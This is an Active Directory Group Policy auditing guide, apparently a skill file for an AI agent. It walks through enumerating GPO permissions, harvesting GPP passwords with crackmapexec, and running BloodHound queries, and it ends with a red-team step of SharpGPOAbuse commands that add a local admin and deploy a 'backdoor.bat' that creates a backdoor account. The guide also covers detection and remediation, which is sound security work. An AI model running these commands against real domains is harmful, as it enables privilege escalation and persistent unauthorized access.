<!-- Copyright (c) 2026 defconxt. All rights reserved. -->
<!-- Licensed under AGPL-3.0 — see LICENSE file for details. -->
---
name: auditing-group-policy-security
description: >-
  Audit Group Policy Objects for security misconfigurations, privilege escalation
  paths, and unauthorized modifications using GPOReport, SharpGPOAbuse, and
  custom GPO analysis tooling.
domain: cybersecurity
subdomain: active-directory-security
tags:
  - group-policy
  - gpo
  - gpo-abuse
  - privilege-escalation
version: "1.0"
author: defconxt
license: AGPL-3.0
metadata:
  mitre-attack: ["T1484.001"]
  frameworks: ["MITRE ATT&CK", "CIS Benchmarks"]
  tools: ["crackmapexec", "bloodhound", "sharpgpoabuse"]
---

# Auditing Group Policy Security

## Overview

Group Policy Objects control security settings across the domain. Misconfigured
GPO permissions allow attackers to modify policies for privilege escalation,
deploy malicious scripts, or weaken security controls. Auditing covers GPO ACLs,
linked OUs, security settings, and script deployments.

## Prerequisites

- Tools: `crackmapexec`, BloodHound, `SharpGPOAbuse.exe`
- Domain credentials with GPO read access
- SYSVOL access (SMB 445) for policy file inspection

## Workflow

### Step 1: Enumerate GPOs and Permissions

```bash
# List all GPOs with crackmapexec
crackmapexec smb 10.0.0.1 -u jsmith -p 'P@ssw0rd' -d corp.local \
  -M gpp_autologin
crackmapexec smb 10.0.0.1 -u jsmith -p 'P@ssw0rd' -d corp.local \
  -M gpp_password

# BloodHound GPO queries
# MATCH (g:GPO)-[r:GpLink]->(o) RETURN g.name, o.name
# MATCH (u)-[r:GenericAll|GenericWrite|WriteOwner|WriteDacl]->(g:GPO) RETURN u.name, g.name

python3 scripts/agent.py enumerate --domain corp.local --dc-ip 10.0.0.1
```

### Step 2: Check GPO Permissions for Abuse

```bash
# Find GPOs writable by current user
# SharpGPOAbuse.exe --SearchGPO

# BloodHound — users with write access to GPOs linked to DA OUs
# MATCH (u:User)-[r:GenericAll|GenericWrite]->(g:GPO)-[:GpLink]->(o:OU)
# WHERE o.name CONTAINS "Domain Controllers" RETURN u.name, g.name

python3 scripts/agent.py audit --domain corp.local --dc-ip 10.0.0.1 --check permissions
```

### Step 3: Audit Security Settings in GPOs

```bash
# Check for GPP passwords in SYSVOL
crackmapexec smb 10.0.0.1 -u jsmith -p 'P@ssw0rd' -d corp.local -M gpp_password

# Inspect GPO security settings
python3 scripts/agent.py audit --domain corp.local --dc-ip 10.0.0.1 --check settings

# Check for scheduled task / script deployment via GPO
python3 scripts/agent.py audit --domain corp.local --dc-ip 10.0.0.1 --check scripts
```

### Step 4: Exploit GPO Misconfiguration (Red Team)

```bash
# Add local admin via writable GPO
# SharpGPOAbuse.exe --AddLocalAdmin --UserAccount jsmith \
#   --GPOName "Vulnerable GPO"

# Add startup script via writable GPO
# SharpGPOAbuse.exe --AddComputerScript --ScriptName backdoor.bat \
#   --ScriptContents "net user backdoor P@ss /add" --GPOName "Vulnerable GPO"
```

## Verification

- [ ] All GPOs enumerated with link targets
- [ ] GPO ACLs audited for excessive write permissions
- [ ] GPP passwords checked across SYSVOL
- [ ] Security settings compared against CIS benchmarks
- [ ] Script and scheduled task deployments reviewed
- [ ] Remediation: restrict GPO edit permissions, remove GPP passwords

## Detection Opportunities

- Event 5136 for GPO attribute modifications
- SYSVOL file creation/modification monitoring
- Event 4704/4705 for user rights assignment changes
- GPO version number changes in Active Directory

## References

- [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse)
- [CIS Group Policy Benchmarks](https://www.cisecurity.org/)
- [GPP Password Decryption](https://adsecurity.org/?p=2288)
